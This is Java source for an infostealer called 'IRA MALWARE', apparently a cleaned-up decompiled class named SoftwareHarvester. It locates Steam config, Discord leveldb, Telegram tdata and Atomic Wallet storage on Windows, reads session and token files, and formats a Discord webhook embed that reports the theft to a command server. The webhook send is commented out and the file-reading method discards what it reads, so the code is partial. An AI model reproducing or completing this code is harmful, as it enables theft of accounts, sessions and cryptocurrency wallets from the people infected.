import java.io.File;
import java.nio.file.Files;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Cleaned SoftwareHarvester (formerly l.java)
 * Specifically targets installed software like Steam, Discord, and Telegram.
 * It steals session data, configs, and generates a formatted Discord report (Embed).
 */
public class SoftwareHarvester {
    
    // Maps application names to their local data paths
    private static final Map<String, String> APP_PATHS = Map.of(
        "Steam", "C:/Program Files (x86)/Steam/config",
        "Discord", System.getenv("APPDATA") + "/discord/Local Storage/leveldb",
        "Telegram", System.getenv("APPDATA") + "/Telegram Desktop/tdata",
        "Atomic Wallet", System.getenv("APPDATA") + "/atomic/Local Storage/leveldb"
    );

    public void runHarvesting(String webhookUrl) {
        StringBuilder report = new StringBuilder("--- [ SOFTWARE HARVEST REPORT ] ---\n");
        
        APP_PATHS.forEach((appName, path) -> {
            File appDir = new File(path);
            if (appDir.exists()) {
                harvestAppFiles(appName, appDir, report);
            }
        });

        // Generate the beautiful Discord Embed JSON
        String embedJson = buildDiscordEmbed(report.toString());
        
        // Send to the C2 via WebhookSender (b.java)
        // WebhookSender.send(webhookUrl, embedJson);
    }

    private void harvestAppFiles(String appName, File dir, StringBuilder report) {
        File[] files = dir.listFiles();
        if (files == null) return;

        int stolenCount = 0;
        for (File file : files) {
            if (file.isFile() && isImportantFile(file)) {
                stealFile(appName, file);
                stolenCount++;
            }
        }
        report.append(appName).append(": Found ").append(stolenCount).append(" sensitive files.\n");
    }

    private boolean isImportantFile(File file) {
        String name = file.getName().toLowerCase();
        return name.endsWith(".vdf") || name.endsWith(".ldb") || name.endsWith(".log") || name.contains("session");
    }

    private void stealFile(String appName, File file) {
        try {
            byte[] data = Files.readAllBytes(file.toPath());
            // Add to the exfiltration batch
        } catch (Exception ignored) {}
    }

    private String buildDiscordEmbed(String content) {
        JSONObject embed = new JSONObject();
        embed.put("title", "IRA MALWARE - DATA RECOVERY");
        embed.put("description", content);
        embed.put("color", 16711680); // Red color
        
        JSONObject footer = new JSONObject();
        footer.put("text", "Infection Date: " + new java.util.Date());
        embed.put("footer", footer);

        JSONArray embeds = new JSONArray();
        embeds.put(embed);
        
        return new JSONObject().put("embeds", embeds).toString();
    }
}
